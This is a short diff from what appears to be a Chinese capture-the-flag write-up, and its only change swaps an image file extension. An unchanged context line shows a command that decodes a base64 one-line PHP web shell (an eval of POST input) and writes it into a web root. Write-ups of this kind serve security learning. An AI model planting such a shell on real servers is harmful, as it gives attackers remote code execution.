@@ -236,7 +236,7 @@ echo serialize($a);
 echo "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="|base64 -d > /var/www/html/shell.php
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 ## 谁是CTF之王？
 
